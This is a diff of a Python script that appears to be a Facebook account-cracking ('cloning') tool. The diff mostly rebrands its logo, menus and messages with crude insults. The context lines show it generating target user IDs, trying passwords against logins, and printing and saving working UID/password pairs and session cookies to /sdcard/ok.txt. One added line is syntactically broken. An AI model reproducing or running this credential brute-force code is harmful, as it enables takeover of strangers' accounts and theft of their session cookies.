@@ -74,14 +74,16 @@ for xd in range(10000):
     ugen.append(uaku2)
 
 logo = ("""
-      ____   ___  ____  _   _    _       ______   ______  _____ ____  
-\033[38;5;46m | __ ) / _ \|  _ \| \ | |  / \     / ___\ \ / / __ )| ____|  _ \ \033[38;5;46m
-\033[38;5;46m |  _ \| | | | | | |  \| | / _ \   | |    \ V /|  _ \|  _| | |_) |\033[38;5;46m
-\033[38;5;46m | |_) | |_| | |_| | |\  |/ ___ \  | |___  | | | |_) | |___|  _ < \033[38;5;46m
-\033[38;5;46m |____/ \___/|____/|_| \_/_/   \_\  \____| |_| |____/|_____|_| \_\\033[38;5;46m
-                                                                                             
+                                              
+\033[38;5;46m ██████╗░░█████╗░██╗░░░░░░█████╗░██████╗░
+\033[38;5;46m ██╔══██╗██╔══██╗██║░░░░░██╔══██╗██╔══██╗
+\033[38;5;46m ██████╦╝██║░░██║██║░░░░░██║░░██║██║░░██║
+\033[38;5;46m ██╔══██╗██║░░██║██║░░░░░██║░░██║██║░░██║
+\033[38;5;46m ██████╦╝╚█████╔╝███████╗╚█████╔╝██████╔╝
+\033[38;5;46m ╚═════╝░░╚════╝░╚══════╝░╚════╝░╚═════╝░
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━|          
- বদনা সাইবার CEO SAAD
+      \033[37;5;46m  NASA HOKER CEO POLATOK
+                       PASA SIZE
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 
 """)
@@ -94,9 +96,11 @@ class Main:
         self.loop = 0
         os.system("clear")
         print(logo)
-        print(" [01] BICI CLONING")
-        print(" [02] PASA CLONING")
-        print(" [00] TOR PASAR SIZE BASI EXIT KORO")
+        print(" [01] TOR BICI CLONING")
+        print(" [02] TOR PASA CLONING")
+        print(" [03] BEST HUDAI CLONING")
+        print(" [04] FAST BICI & PASA CLONING") 
+        print(" [00] TOMAR PASAR SIZE 46  EXIT KORO")
         print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         Mumit =input(" [?] Choose : ")
         os.system('xdg-open https://www.facebook.com/profile.php?id=100093064795809')
@@ -119,7 +123,7 @@ def num():
     kod = ''.join(random.choice(string.digits) for _ in range(2))
     os.system('clear')
     print(logo)
-    print(' [+] TOR PASAR SIZE KOTO : 3000, 5000, 10000, 50000 ')
+    print(' [+] TOR PASAR SIZE KOTO : 32, 36, 46, 48 ')
     print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     limit = int(input(' [?] Crack Limit : '))
     for nmbr in range(limit):
@@ -130,9 +134,9 @@ def num():
         print(logo)
         tl = str(len(user))
         print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
-        print(' \033[1;97m[+] PASAR SIZE ONEK TAI HACK HoIBo nah')
+        print(' \033[1;97m[+] PASAR SIZE ONEK TAI BASE MANA 46  EXIT KORO)
         print(' \033[1;97m[!] Wait for ids ')
-        print(' \033[1;97m[!] বদনা সাইবারCEO SAAD ')
+        print(' \033[1;97m[!] NASA HOKER CEO POLATOK ')
         print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         for guru in user:
             uid = kode+kodex+kod+guru
@@ -151,12 +155,12 @@ def gml():
     kodex = input(' [?] Target last name :  ')
     os.system('clear')
     print(logo)
-    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
+    print(' [+] EXAMPLE : @nasahoker.com, @pasasize.com ')
     print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     doamin = input(' [?] Terget doamin : ')
     os.system('clear')
     print(logo)
-    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
+    print(' [+] EXAMPLE : 10000, 20000, 30000, 40000, 50000 ')
     print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     limit = int(input('[?] Crack Limit : '))
     for nmbr in range(limit):
@@ -221,7 +225,7 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[PASA HACKER SAAD-OK] {uid} | {ps}")
+                print(f"\033[38;5;46m[NASA HOKER-OK] {uid} | {ps}")
                 print(f" Cookie : {coki}")
                 print("\x1b[38;5;208m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                 open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
@@ -230,14 +234,14 @@ def rcrack1(uid,pwx,tl):
             #elif 'checkpoint' in log_cookies:
                 #coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 #cid = coki[82:97]
-                #print(f"\x1b[38;5;196m[𝐀.𝐀𝐚𝐥𝐚𝐱 𝐉𝐚𝐡𝐢𝐝-CP] {cid} | {ps}")
+                #print(f"\x1b[38;5;196m[NASA HOKER-CP] {cid} | {ps}")
                 #open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                 #cps.append(uid)
                 #break
             else:
                 continue
         loop+=1
-        #sys.stdout.write(f'\r\033[m[𝐀.𝐀𝐚𝐥𝐚𝐱 𝐉𝐚𝐡𝐢𝐝] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        #sys.stdout.write(f'\r\033[m[NASA HOKER] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         #sys.stdout.flush()
     except:
         pass
